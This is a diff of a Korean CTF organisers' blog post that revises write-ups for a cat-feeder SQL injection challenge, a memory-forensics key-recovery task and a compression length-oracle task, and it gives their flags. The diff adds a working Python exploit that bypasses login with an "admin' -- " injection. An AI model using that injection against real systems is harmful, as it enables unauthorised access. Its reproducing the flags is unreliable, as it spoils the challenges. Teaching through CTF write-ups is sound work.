-![대회 플랫폼의 MEOWPASS 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-meowpass-challenge.png)
+![대회 플랫폼의 급식기 사건 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-meowpass-challenge.png)
 
-MEOWPASS는 스마트 급식기의 새벽 이벤트를 조사하는 화이트박스 입문용 웹 문제입니다. 의뢰인은 닷새째 새벽 4시 04분마다 참치가 사라지고 있지만 자신의 고양이 나비는 당시 침대에서 자고 있었다고 설명합니다. 급식기에는 등록하지 않은 목걸이 태그 `MP-C7:04:04`가 남아 있습니다.
+*그림 10. 스마트 급식기 사건 의뢰 화면.*
+{: .text-center }
 
-![로컬에서 실행한 MEOWPASS 로그인 화면](../../assets/img/room-escape-ctf/extra-requests/meowpass-local-login.png)
+이 의뢰는 스마트 급식기의 새벽 이벤트를 조사하는 화이트박스 입문용 웹 문제입니다. 의뢰인은 닷새째 새벽 4시 04분마다 참치가 사라지고 있지만 자신의 고양이 나비는 당시 침대에서 자고 있었다고 설명합니다. 급식기에는 등록하지 않은 목걸이 태그 `MP-C7:04:04`가 남아 있습니다.
+
+![로컬에서 실행한 급식기 로그인 화면](/assets/img/room-escape-ctf/extra-requests/meowpass-local-login.png)
+
+*그림 11. 로컬에서 재현한 급식기 로그인 화면.*
+{: .text-center }
 
 참가자에게는 의뢰문과 함께 운영 서비스와 동일한 취약점·화면 로직을 가진 `app.py`를 제공합니다. 공개 소스의 플래그만 `SHA{local_dummy_flag}`로 치환하고 템플릿, 정적 리소스, 운영 환경변수와 실제 플래그는 제외했습니다. 따라서 참가자는 무작위 대입이 아니라 제공된 소스를 읽어 의도한 취약점을 찾을 수 있습니다.
 
@@ -494,7 +984,10 @@ MEOWPASS는 스마트 급식기의 새벽 이벤트를 조사하는 화이트박
 
 게스트 계정은 사건 번호와 급식 이벤트까지 확인할 수 있지만 보호자와 반려동물 필드는 숨겨집니다. 참가자는 이 화면에서 조사할 사건이 `#404`이며, 다음 단계가 운영자 권한 획득임을 알 수 있습니다.
 
-![게스트 계정에서 보호자 정보가 가려진 MEOWPASS 사건 화면](../../assets/img/room-escape-ctf/extra-requests/meowpass-local-guest-event.png)
+![게스트 계정에서 보호자 정보가 가려진 사건 화면](/assets/img/room-escape-ctf/extra-requests/meowpass-local-guest-event.png)
+
+*그림 12. 게스트 계정에서 확인한 제한된 사건 정보.*
+{: .text-center }
 
 ```text
 로그인 계정 : guest / guest
@@ -537,7 +1030,10 @@ password: x
 
 운영자 세션으로 이벤트 `#404`를 다시 열면 고양이 이름 `건공이`, 보호자 계정과 사건 원인을 확인할 수 있습니다. 인접 세대의 태그가 공유 급식 그룹에 잘못 연결된 것이 원인이었습니다.
 
-![SQL Injection 성공 후 확인한 MEOWPASS 사건 화면](../../assets/img/room-escape-ctf/extra-requests/meowpass-local-admin-event.png)
+![SQL Injection 성공 후 확인한 사건 화면](/assets/img/room-escape-ctf/extra-requests/meowpass-local-admin-event.png)
+
+*그림 13. 운영자 권한으로 다시 확인한 사건 정보.*
+{: .text-center }
 
 #### 3. 사건 확인 코드 제출
 
@@ -553,7 +1049,7 @@ password: x
 
 #### 4. 출제 의도
 
-MEOWPASS는 추가 의뢰를 한 문제도 시작하지 못하는 팀이 생기지 않도록 배치한 초급 SQL Injection 문제입니다. 소스에서 취약한 쿼리를 찾고 직접 입력을 구성하면 짧은 과정으로 해결할 수 있게 했으며, 처음 Web 문제를 접한 참가자도 화이트박스 분석과 권한 우회의 기본 흐름을 경험하도록 구성했습니다.
+이 의뢰는 추가 의뢰를 한 문제도 시작하지 못하는 팀이 생기지 않도록 배치한 초급 SQL Injection 문제입니다. 소스에서 취약한 쿼리를 찾고 직접 입력을 구성하면 짧은 과정으로 해결할 수 있게 했으며, 처음 Web 문제를 접한 참가자도 화이트박스 분석과 권한 우회의 기본 흐름을 경험하도록 구성했습니다.
 
 기술 구조는 단순하지만 대회의 의뢰 형식에 맞게 스마트 급식기, 새벽 4시 04분의 이벤트와 사라진 참치를 하나의 사건으로 연결하는 과정이 필요했습니다. 쉬운 문제도 정답 입력만 남겨 두지 않고 대회 전체의 탐정사무소 콘셉트 안에서 자연스럽게 읽히도록 구성했습니다.
 
@@ -561,6 +1057,41 @@ MEOWPASS는 추가 의뢰를 한 문제도 시작하지 못하는 팀이 생기�
 SHA{wh0_ate_the_tuna_at_0404}
 ```
 
+#### 5. exploit
+
+```python
+#!/usr/bin/env python3
+import http.cookiejar
+import re
+import sys
+import urllib.parse
+import urllib.request
+
+
+def main() -> int:
+    base_url = (
+        sys.argv[1] if len(sys.argv) > 1 else "http://web.roomescapectf2026.site:40584"
+    ).rstrip("/")
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
+    )
+
+    body = urllib.parse.urlencode({"username": "admin' -- ", "password": "x"}).encode()
+    opener.open(f"{base_url}/login", body, timeout=5).read()
+    page = opener.open(f"{base_url}/events/404", timeout=5).read()
+
+    match = re.search(rb"SHA\{[A-Za-z0-9_!?.:-]+\}", page)
+    if match is None:
+        print("[-] flag not found", file=sys.stderr)
+        return 1
+
+    print(match.group(0).decode())
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
 ### 2.8 키는 사라졌지만, 흔적은 남아 있을까요?
 
 | 항목 | 내용 |
@@ -573,9 +1104,12 @@ SHA{wh0_ate_the_tuna_at_0404}
 | 목표 | 소거된 타원곡선 스칼라의 흔적을 복구해 삭제 PDF 복원 |
 | 플래그 | `SHA{wh3n_k3ys_v4n1sh_m3m0ry_r3m3mb3rs}` |
 
-![대회 플랫폼의 KEYPSAKE 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-keypsake-challenge.png)
+![대회 플랫폼의 삭제 기록 복구 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-keypsake-challenge.png)
 
-KEYPSAKE는 실행 중인 서비스의 MiniDump와 암호화된 백업 볼륨을 연결해 삭제된 문서를 복구하는 정적 포렌식 문제입니다. 참가자에게는 telemetry provider DLL, 압축된 메모리 덤프와 암호화 볼륨을 제공합니다.
+*그림 14. 삭제 기록 복구 의뢰 화면.*
+{: .text-center }
+
+이 의뢰는 실행 중인 서비스의 MiniDump와 암호화된 백업 볼륨을 연결해 삭제된 문서를 복구하는 정적 포렌식 문제입니다. 참가자에게는 telemetry provider DLL, 압축된 메모리 덤프와 암호화 볼륨을 제공합니다.
 
 ```text
 telemetry_provider.dll
@@ -618,6 +1152,9 @@ Q - known*G = left*G + right*G
 SHA{wh3n_k3ys_v4n1sh_m3m0ry_r3m3mb3rs}
 ```
 
+#### 5. exploit
+
+전체 익스플로잇 코드는 [GitHub 저장소](https://github.com/GEONWOOHAN/room_escape_ctf/blob/main/blog-exploits/extra-requests/keypsake-exploit.py)에서 확인할 수 있습니다.
 ### 2.9 나를 쫓아낸 회사의 진짜 복구 기록을 가져오세요
 
 | 항목 | 내용 |
@@ -630,9 +1167,12 @@ SHA{wh3n_k3ys_v4n1sh_m3m0ry_r3m3mb3rs}
 | 목표 | 압축 후 버킷 크기만 보이는 백업에서 실제 `recovery` 레코드 복구 |
 | 플래그 | `SHA{a1b2c3d4e5f6-90d2}` |
 
-![대회 플랫폼의 Vault Boundary 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-vault-boundary-challenge.png)
+![대회 플랫폼의 전자 금고 복구 기록 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-vault-boundary-challenge.png)
 
-Vault Boundary는 손님 계정의 공유 메모를 관리자 백업에 섞어 넣고, 압축된 결과의 길이만 관찰해 실제 `recovery` 레코드를 복구하는 길이 오라클 문제입니다.
+*그림 15. 전자 금고 복구 기록 의뢰 화면.*
+{: .text-center }
+
+이 의뢰는 손님 계정의 공유 메모를 관리자 백업에 섞어 넣고, 압축된 결과의 길이만 관찰해 실제 `recovery` 레코드를 복구하는 길이 오라클 문제입니다.
 
 백업 본문은 압축 후 AES-GCM으로 암호화되며 참가자에게는 16바이트 버킷 단위의 크기만 보입니다. 레코드 배치와 패딩 순서는 요청 카운터, 스타일, 팀과 epoch에 따라 바뀌고 여러 미끼 레코드도 함께 존재합니다.
 
@@ -677,34 +1217,11 @@ CRC16-CCITT   : 90d2
 SHA{a1b2c3d4e5f6-90d2}
 ```
 
-## 3. 의뢰 검수
+#### 5. exploit
 
-메인 의뢰는 사건 전체에 대한 최종 수사보고서를 제출받았습니다. 추가 의뢰는 문제별 풀이 과정과 근거를 작성한 라이트업을 각각의 의뢰 결과 보고서로 제출받았습니다. 운영진은 대회 플랫폼의 플래그 제출 기록과 이 보고서를 함께 검토해 최종 점수를 반영했습니다.
+전체 익스플로잇 코드는 [GitHub 저장소](https://github.com/GEONWOOHAN/room_escape_ctf/blob/main/blog-exploits/extra-requests/vault-boundary-exploit.py)에서 확인할 수 있습니다.
+## 3. 마치며
 
-### 3.1 플래그 및 의뢰 결과 보고서 제출
+추가 의뢰는 메인 시나리오의 현장 조사와 별도로 진행할 수 있도록 구성했습니다. 웹 서비스의 소스와 동작을 살펴보는 문제부터 커널 객체의 수명 분석, 가상 머신의 최적화 동작 추적, 암호화된 저장소의 복구까지 다양한 주제를 다뤘습니다. 참가자는 각 의뢰서에 담긴 상황을 바탕으로 제공 파일이나 서비스에서 단서를 찾고, 분석 결과를 플래그와 라이트업으로 정리했습니다.
 
-참가자는 문제에서 얻은 `SHA{...}` 형식의 플래그를 팀 계정으로 대회 플랫폼에 제출했습니다. 플랫폼 기록으로 정답 여부와 해결 시각을 확인하고, 라이트업으로 실제 풀이 과정과 근거를 확인했습니다.
-
-라이트업에는 분석에 사용한 자료, 핵심 단서, 취약점 또는 복구 원리, 주요 명령과 코드, 플래그를 얻은 과정이 포함되어야 했습니다. 모든 시행착오를 기록할 필요는 없지만, 제공 자료에서 정답에 도달하는 핵심 과정은 재현할 수 있어야 했습니다.
-
-### 3.2 의뢰 결과 검수 기준
-
-운영진은 공식 풀이와 제출된 라이트업을 대조해 다음 항목을 확인했습니다.
-
-| 검수 항목 | 확인 내용 |
-|---|---|
-| 의뢰 목표 | 의뢰인이 요구한 결과와 실제 문제의 목표를 정확히 파악했는지 |
-| 분석 근거 | 바이너리, 패킷, 메모리, 소스 코드 또는 서버 응답에서 결론을 뒷받침하는 증거를 제시했는지 |
-| 기술적 정확성 | 취약점의 발생 조건과 암호·VM·파일 구조, 공격 또는 복구 원리를 정확히 설명했는지 |
-| 재현 가능성 | 핵심 명령, 코드, 입력값과 중간 결과가 남아 있어 같은 제공 자료로 풀이를 재현할 수 있는지 |
-| 결과 도출 | 분석 과정에서 플래그가 실제로 도출되며, 단순 추측이나 정답 문자열 기재에 그치지 않았는지 |
-
-플래그만 기재하거나 핵심 분석 과정이 빠진 보고서는 풀이 근거를 확인할 수 없으므로 완전한 의뢰 결과로 인정하지 않았습니다.
-
-### 3.3 공식 풀이와 다른 접근
-
-공식 풀이와 다른 방법을 사용했더라도 기술적으로 타당하고 같은 환경에서 재현할 수 있다면 유효한 풀이로 인정했습니다. 의도하지 않은 취약점을 사용한 경우에는 제공 자료와 운영 서비스만으로 공격 경로가 성립하는지, 우연한 서버 상태나 다른 팀의 데이터에 의존하지 않는지를 추가로 확인했습니다.
-
-### 3.4 수동 채점 및 최종 점수
-
-대회 플랫폼의 제출 기록과 라이트업의 풀이 근거가 모두 확인된 문제는 해당 팀의 해결 문제로 인정했습니다. 설명이 부족한 경우에는 함께 제출된 코드와 중간 산출물을 추가로 대조했습니다. 검수가 끝난 뒤 인정된 문제와 보고서 평가 결과를 바탕으로 운영진이 팀별 최종 점수를 수동으로 확정했습니다.
+문제마다 접근 방식과 필요한 배경지식은 달랐지만, 의뢰의 단서를 하나씩 확인해 결론에 이르는 과정은 공통적이었습니다. 이 글의 문제별 풀이와 익스플로잇은 그 과정을 다시 따라가 볼 수 있도록 정리한 기록입니다.
